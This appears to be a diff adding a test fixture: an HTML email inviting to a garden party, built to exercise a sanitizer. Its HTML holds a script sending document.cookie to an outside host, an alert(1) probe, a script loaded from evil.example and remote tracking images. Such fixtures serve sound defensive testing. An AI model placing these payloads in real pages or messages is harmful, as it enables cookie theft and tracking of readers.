@@ -1,0 +1,10 @@
+From: Events <events@example.org>
+To: me@desk.example
+Date: Fri, 13 Nov 2026 10:00:00 +0000
+Subject: Garden party
+Message-ID: <html-script-style@corpus.example>
+MIME-Version: 1.0
+X-Corpus-Note: HTML with script in head and body, style blocks, and a style attribute loading a remote image
+Content-Type: text/html; charset=utf-8
+
+<html><head><style>body{background:url(https://bg.example.com/track.png)} .x{color:red}</style><script>document.write('<img src=https://x.example/'+document.cookie+'>')</script></head><body><p>The garden party starts at four.</p><script type="text/javascript">alert(1)</script><p style="background-image:url('https://bg.example.com/p.png')">Bring a chair.</p><SCRIPT SRC=https://evil.example/x.js></SCRIPT></body></html>
